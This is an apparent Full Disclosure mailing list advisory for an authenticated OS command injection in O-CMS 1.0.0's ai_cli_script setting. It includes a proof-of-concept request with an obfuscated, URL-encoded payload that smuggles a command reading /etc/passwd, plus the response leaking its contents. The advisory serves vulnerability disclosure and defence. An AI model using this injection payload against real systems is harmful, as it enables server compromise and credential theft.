---
title: O-CMS 1.0.0 Authenticated OS Command Injection via	ai_cli_script
url: https://seclists.org/fulldisclosure/2026/Sep/28
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:31.455990
---

# O-CMS 1.0.0 Authenticated OS Command Injection via	ai_cli_script

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](27)
[By Date](date.html#28)
[![Next](/images/right-icon-16x16.png)](29)

[![Previous](/images/left-icon-16x16.png)](27)
[By Thread](index.html#28)
[![Next](/images/right-icon-16x16.png)](29)

![](/shared/images/nst-icons.svg#search)

# O-CMS 1.0.0 Authenticated OS Command Injection via ai\_cli\_script

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Mon, 31 Aug 2026 22:56:58 -0400

---

```
Description

O-CMS version 1.0.0 contains an authenticated OS command injection
vulnerability in the AI CLI configuration functionality. An authenticated
attacker with sufficient privileges can supply shell metacharacters and
additional commands through the ai_cli_script parameter of
/admin/settings/save.

When the configured AI provider is subsequently tested through
/admin/settings/test-ai, the attacker-controlled CLI value is executed in a
shell-capable context. This allows injected operating-system commands to
execute with the privileges of the O-CMS application process.

The vulnerability was demonstrated by injecting a command that reads
/etc/passwd. Triggering the AI test functionality caused O-CMS to execute
the injected command and return contents of /etc/passwd in the HTTP
response.
Impact

 An authenticated attacker can execute arbitrary operating-system commands
with the privileges of the O-CMS application process. This may result in
unauthorized access to local files, disclosure of application secrets and
credentials, modification or deletion of application data, execution of
attacker-controlled code, and potential compromise of the underlying server.
Proof of Concept

The following authenticated request stores an ai_cli_script value
containing shell command injection syntax:

POST /admin/settings/save HTTP/1.1
Host: 127.0.0.1:8080
Cookie: ocms_session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

_csrf_token=<REDACTED>&ai_provider=cli&ai_cli_script=%2Ftmp%2Focms-cli%3Bcat%24%7BIFS%7D%24%28echo%24%7BIFS%7DL2V0Yy9wYXNzd2Q%3D%3D%7Cbase64%24%7BIFS%7D-d%29%3B%23

The application accepts the configuration:

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

The stored CLI configuration is then executed through the AI testing
functionality:

POST /admin/settings/test-ai HTTP/1.1
Host: 127.0.0.1:8080
Cookie: ocms_session=<REDACTED>
Content-Type: application/json

{"_csrf_token":"<REDACTED>"}

O-CMS executes the injected command and returns data originating from
/etc/passwd:

HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Claude CLI funziona. Risposta:
root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin\/..."}

The presence of entries such as:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

confirms successful execution of an attacker-controlled operating-system
command.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](27)
[By Date](date.html#28)
[![Next](/images/right-icon-16x16.png)](29)

[![Previous](/images/left-icon-16x16.png)](27)
[By Thread](index.html#28)
[![Next](/images/right-icon-16x16.png)](29)

### Current thread:

* **O-CMS 1.0.0 Authenticated OS Command Injection via ai\_cli\_script** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")